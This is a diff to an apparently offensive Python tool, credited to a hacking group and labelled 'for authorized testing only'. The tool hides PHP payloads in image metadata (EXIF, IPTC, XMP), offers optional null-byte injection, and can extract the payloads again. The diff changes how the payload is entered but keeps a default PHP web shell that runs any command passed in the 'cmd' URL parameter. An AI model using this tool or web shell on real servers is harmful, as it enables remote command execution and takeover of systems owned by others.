@@ -19,11 +19,10 @@ def print_banner():
     👤 Made by: Ariyan Bin Bappy
     ☠️  Group: Octo Dark Cyber Squad
     ⚠️  For authorized testing only
-  
-
 """
     print(banner)
 
+# Injection Functions
 def inject_php_exif_usercomment(image_path, output_path, php_payload, nullbyte_inject=False):
     if nullbyte_inject:
         php_payload += "\x00"
@@ -115,6 +114,7 @@ def inject_payload(image_path, output_path, php_payload, method="usercomment", n
     else:
         func(image_path, output_path, php_payload)
 
+# Extraction
 def extract_php_exif_usercomment(image_path: str):
     try:
         exif_dict = piexif.load(image_path)
@@ -153,6 +153,7 @@ def extract_php_exif_imagedescription(image_path: str):
     except Exception as e:
         print(f"[-] Error extracting EXIF ImageDescription payload: {e}")
 
+# Entry Point
 if __name__ == "__main__":
     print_banner()
 
@@ -165,15 +166,30 @@ if __name__ == "__main__":
     if choice == "1":
         img_in = input("Enter path to the original image file: ").strip()
         img_out = input("Enter output file name (e.g., injected.jpg): ").strip()
-        payload = input("Enter PHP payload (leave empty for default web shell): ").strip()
-        if not payload:
-            payload = "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>"
+
+        payload = ""
+        payload_input = input("Enter PHP payload directly or type 'file' to load from file: ").strip()
+        if payload_input.lower() == 'file':
+            file_path = input("Enter path to PHP payload file: ").strip()
+            try:
+                with open(file_path, 'r') as f:
+                    payload = f.read().strip()
+                    if not payload:
+                        print("[-] Payload file is empty.")
+                        exit(1)
+            except Exception as e:
+                print(f"[-] Failed to read file: {e}")
+                exit(1)
+        else:
+            payload = payload_input if payload_input else "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>"
+
         print("Injection methods available: usercomment, imagedescription, iptc, xmp")
         method = input("Enter injection method: ").strip().lower()
         nullbyte_inject = False
         if method in ["usercomment", "imagedescription"]:
             nb_choice = input("Enable null byte injection? (y/n): ").strip().lower()
             nullbyte_inject = nb_choice == "y"
+
         inject_payload(img_in, img_out, payload, method=method, nullbyte_inject=nullbyte_inject)
 
     elif choice == "2":
